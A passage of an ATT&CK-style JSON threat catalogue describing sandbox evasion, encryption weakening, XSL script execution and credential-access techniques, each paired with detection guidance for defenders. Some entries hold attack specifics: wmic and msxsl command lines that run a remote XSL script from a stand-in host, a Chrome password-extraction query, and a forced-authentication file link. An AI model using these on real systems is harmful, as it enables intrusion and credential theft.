        "description": " \nAdversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nAdversaries may use several methods to accomplish  Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.  \n ",
        "detection": "\nVirtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1497.001": {
        "name": "System Checks",
        "description": " \nAdversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nSpecific checks may will vary based on the target and/or adversary, but may involve behaviors such as  Windows Management Instrumentation ,  PowerShell ,  System Information Discovery , and  Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as uptime and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.  \nIn applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.  \n ",
        "detection": "\nVirtualization/sandbox related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1497.002": {
        "name": "User Activity Based Checks",
        "description": " \nAdversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \nAdversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks  \n, browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro  \nor waiting for a user to double click on an embedded image to activate.  \n  ",
        "detection": "\nUser activity-based checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \n\n"
      },
      "T1497.003": {
        "name": "Time Based Evasion",
        "description": " \nAdversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time. \nAdversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:  Scheduled Task/Job ). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled  Multi-Stage Channels to avoid analysis and scrutiny.  ",
        "detection": "\nTime-based evasion will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. \n\n"
      },
      "T1600": {
        "name": "Weaken Encryption",
        "description": " \nAdversaries may compromise a network device’s encryption capability in order to bypass encryption that would otherwise protect data communications.  \n\nEncryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key. \nAdversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as  Modify System Image ,  Reduce Key Space , and  Disable Crypto Hardware , an adversary can negatively effect and/or eliminate a device’s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts.  \n ",
        "detection": "\nThere is no documented method for defenders to directly identify behaviors that weaken encryption. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image. Some detection methods require vendor support to aid in investigation.\n\n"
      },
      "T1600.001": {
        "name": "Reduce Key Space",
        "description": " \nAdversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.  \n\nAdversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key. \nAdversaries may modify the key size used and other encryption parameters using specialized commands in a  Network Device CLI introduced to the system through  Modify System Image to change the configuration of the device.  \n ",
        "detection": "\nThere is no documented method for defenders to directly identify behaviors that reduce encryption key space. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.\n\n"
      },
      "T1600.002": {
        "name": "Disable Crypto Hardware",
        "description": " \nAdversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data. \nMany network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of  Modify System Image , forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g.,  Reduce Key Space ).  \n ",
        "detection": "\nThere is no documented method for defenders to directly identify behaviors that disable cryptographic hardware. Detection efforts may be focused on closely related adversary behaviors, such as Modify System Image and Network Device CLI. Some detection methods require vendor support to aid in investigation.\n\n"
      },
      "T1220": {
        "name": "XSL Script Processing",
        "description": " \nAdversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages.  \n\nAdversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to  Trusted Developer Utilities Proxy Execution , the Microsoft common line transformation utility binary (msxsl.exe)  \ncan be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  \nSince msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  \nMsxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.  \n\nCommand-line examples:  \n \n msxsl.exe customers[.]xml script[.]xsl  msxsl.exe script[.]xsl script[.]xsl  msxsl.exe script[.]jpeg script[.]jpeg \nAnother variation of this technique, dubbed \"Squiblytwo\", involves using  Windows Management Instrumentation to invoke JScript or VBScript within an XSL file.  \nThis technique can also execute local/remote scripts and, similar to its  Regsvr32 / \"Squiblydoo\" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  Windows Management Instrumentation provided they utilize the /FORMAT switch.  \n\nCommand-line examples:  \n \nLocal File:  wmic process list /FORMAT:evil[.]xsl Remote File:  wmic os get /FORMAT:\"https[:]//example[.]com/evil[.]xsl\"  ",
        "detection": "\nUse process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting).     Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.\n\n"
      }
    }
  },
  "TA0006": {
    "name": "Credential Access",
    "description": "\nThe adversary is trying to steal account names and passwords.Credential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.\n",
    "technique": {
      "T1110": {
        "name": "Brute Force",
        "description": " \nAdversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.  ",
        "detection": "\nMonitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials. Also monitor for many failed authentication attempts across various accounts that may result from password spraying attempts. It is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network.\n\n"
      },
      "T1110.001": {
        "name": "Password Guessing",
        "description": " \nAdversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts. \nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.  \n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following: SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP) \nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.  \n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.  ",
        "detection": "\nMonitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\n"
      },
      "T1110.002": {
        "name": "Password Cracking",
        "description": " \nAdversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained.  OS Credential Dumping is used to obtain password hashes, this may only get an adversary so far when  Pass the Hash is not an option. Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.  \nThe resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.  ",
        "detection": "\nIt is difficult to detect when hashes are cracked, since this is generally done outside the scope of the target network. Consider focusing efforts on detecting other adversary behavior used to acquire credential materials, such as OS Credential Dumping or Kerberoasting.\n\n"
      },
      "T1110.003": {
        "name": "Password Spraying",
        "description": " \nAdversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords.  \n\nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following: SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP) \nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.  \n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.  ",
        "detection": "\nMonitor authentication logs for system and application login failures of Valid Accounts. Specifically, monitor for many failed authentication attempts across various accounts that may result from password spraying attempts.Consider the following event IDs: Domain Controllers: \"Audit Logon\" (Success & Failure) for event ID 4625.Domain Controllers: \"Audit Kerberos Authentication Service\" (Success & Failure) for event ID 4771.All systems: \"Audit Logon\" (Success & Failure) for event ID 4648.\n\n"
      },
      "T1110.004": {
        "name": "Credential Stuffing",
        "description": " \nAdversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts. \nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. \nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following: SSH (22/TCP) Telnet (23/TCP) FTP (21/TCP) NetBIOS / SMB / Samba (139/TCP & 445/TCP) LDAP (389/TCP) Kerberos (88/TCP) RDP / Terminal Services (3389/TCP) HTTP/HTTP Management Services (80/TCP & 443/TCP) MSSQL (1433/TCP) Oracle (1521/TCP) MySQL (3306/TCP) VNC (5900/TCP) \nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.  \n ",
        "detection": "\nMonitor authentication logs for system and application login failures of Valid Accounts. If authentication failures are high, then there may be a brute force attempt to gain access to a system using legitimate credentials.\n\n"
      },
      "T1555": {
        "name": "Credentials from Password Stores",
        "description": " \nAdversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications that store passwords to make it easier for users manage and maintain. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.  ",
        "detection": "\nMonitor system calls, file read events, and processes for suspicious activity that could indicate searching for a password  or other activity related to performing keyword searches (e.g. password, pwd, login, store, secure, credentials, etc.) in process memory for credentials. File read events should be monitored surrounding known password storage applications.\n\n"
      },
      "T1555.001": {
        "name": "Keychain",
        "description": " \nAdversaries may collect the keychain storage data from a system to acquire credentials. Keychains are the built-in way for macOS to keep track of users' passwords and credentials for many services and features such as WiFi passwords, websites, secure notes, certificates, and Kerberos. Keychain files are located in  ~/Library/Keychains/ ,  /Library/Keychains/ , and  /Network/Library/Keychains/ .  \nThe  security command-line utility, which is built into macOS by default, provides a useful way to manage these credentials. \nTo manage their credentials, users have to use additional credentials to access their keychain. If an adversary knows the credentials for the login keychain, then they can get access to all the other credentials stored in this vault.  \nBy default, the passphrase for the keychain is the user’s logon credentials.  ",
        "detection": "\nUnlocking the keychain and using passwords from it is a very common process, so there is likely to be a lot of noise in any detection technique. Monitoring of system calls to the keychain can help determine if there is a suspicious process trying to access it.\n\n"
      },
      "T1555.002": {
        "name": "Securityd Memory",
        "description": " \nAn adversary may obtain root access (allowing them to read securityd’s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user’s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.  \n  \n\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple’s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.  \n  \nApple’s securityd utility takes the user’s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user’s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.  \n ",
        "detection": "\nMonitor processes and command-line arguments for activity surrounded users searching for credentials or using automated tools to scan memory for passwords.\n\n"
      },
      "T1555.003": {
        "name": "Credentials from Web Browsers",
        "description": " \nAdversaries may acquire credentials from web browsers by reading files specific to the target browser.  \nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers. \nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file,  AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data and executing a SQL query:  SELECT action_url, username_value, password_value FROM logins; . The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function  CryptUnprotectData , which uses the victim’s cached logon credentials as the decryption key.  \n\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.  \n \n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.  \n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).  ",
        "detection": "\nIdentify web browser files that contain credentials such as Google Chrome’s Login Data database file: AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data. Monitor file read events of web browser files that contain credentials, especially when the reading process is unrelated to the subject web browser. Monitor process execution logs to include PowerShell Transcription focusing on those that perform a combination of behaviors including reading web browser process memory, utilizing regular expressions, and those that contain numerous keywords for common web applications (Gmail, Twitter, Office365, etc.).\n\n"
      },
      "T1212": {
        "name": "Exploitation for Credential Access",
        "description": " \nAdversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain access to systems. One example of this is MS14-068, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.  \n \nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.  ",
        "detection": "\nDetecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. Credential resources obtained through exploitation may be detectable in use if they are not normally used or seen.\n\n"
      },
      "T1187": {
        "name": "Forced Authentication",
        "description": " \nAdversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept. \nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  \nThis behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources. \nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.  \n  \n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e.  Template Injection ), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.  \nWith access to the credential hash, an adversary can perform off-line  Brute Force cracking to gain access to plaintext credentials.  \n\nThere are several different ways this can occur.  \nSome specifics from in-the-wild use include: A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e.  Template Injection ). The document can include, for example, a request similar to  file[:]//[remote address]/Normal.dotm to trigger the SMB request.  \nA modified .LNK or .SCF file with the icon filename pointing to an external reference such as  \\[remote address]\\pic.png that will force the system to load the resource when the icon is rendered to repeatedly gather credentials.  \n ",
        "detection": "\nMonitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.Monitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered.  \n\n"
      },
      "T1056": {
        "name": "Input Capture",
        "description": " \nAdversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g.  Credential API Hooking ) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g.  Web Portal Capture ).  ",
        "detection": "\nDetection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. SetWindowsHook, GetKeyState, and GetAsyncKeyState) , monitoring for malicious instances of Command and Scripting Interpreter, and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.\n\n"
      },
      "T1056.001": {
        "name": "Keylogging",
        "description": " \nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when  OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. \nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.  \nSome methods include: Hooking API callbacks used for processing keystrokes. Unlike  Credential API Hooking , this focuses solely on API functions intended for processing keystroke data. Reading raw keystroke data from the hardware buffer. Windows Registry modifications. Custom drivers.  Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.  \n  ",
        "detection": "\nKeyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsyncKeyState.  Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\n"
      },
      "T1056.002": {
        "name": "GUI Input Capture",
        "description": " \nAdversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:  Bypass User Account Control ). \nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.  \nThis type of prompt can be used to collect credentials via various languages such as AppleScript  \n \nand PowerShell  \n \n.  ",
        "detection": "\nMonitor process execution for unusual programs as well as malicious instances of Command and Scripting Interpreter that could be used to prompt users for credentials.Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.\n\n"
      },
      "T1056.003": {
        "name": "Web Portal Capture",
        "description": " \nAdversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service. \nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through  External Remote Services and  Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.  \n ",
        "detection": "\nFile monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.\n\n"
      },
      "T1056.004": {
        "name": "Credential API Hooking",
        "description": " \nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.  \nUnlike  Keylogging ,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:  Hooks procedures , which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.  \n \n Import address table (IAT) hooking , which use modifications to a process’s IAT, where pointers to imported API functions are stored.  \n \n \n Inline hooking , which overwrites the first bytes in an API function to redirect code flow.  \n \n \n ",
        "detection": "\nMonitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure.   Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools    or by programmatically examining internal kernel structures.  Rootkits detectors  can also be used to monitor for various types of hooking activity.Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  to compare the in-memory IAT to the real addresses of the referenced functions.  \n\n"
      },
      "T1557": {
        "name": "Man-in-the-Middle",
        "description": " \nAdversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as  Network Sniffing or  Transmitted Data Manipulation . By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.  \n\nAdversaries may leverage the MiTM position to attempt to modify traffic, such as in  Transmitted Data Manipulation . Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.  ",
        "detection": "\nMonitor network traffic for anomalies associated with known MiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.\n\n"
      },
      "T1557.001": {
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
        "description": " \nBy responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.  \n  \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  Network Sniffing and crack the hashes offline through  Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.  \n \n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and  Responder .  \n  \n  \n ",
        "detection": "\nMonitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled.  Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.Deploy an LLMNR/NBT-NS spoofing detection tool.  Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques. \n\n"
      },
      "T1557.002": {
        "name": "ARP Cache Poisoning",
        "description": " \nAdversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as  Network Sniffing or  Transmitted Data Manipulation . \nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.  \nDevices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache. \nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment. \nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.  \n \n\nAdversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.  \n ",
        "detection": "\nMonitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.\n\n"
      },
      "T1556": {
        "name": "Modify Authentication Process",
        "description": " \nAdversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows or pluggable authentication modules (PAM) on Unix-based systems, responsible for gathering, storing, and validating credentials. \nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.  ",
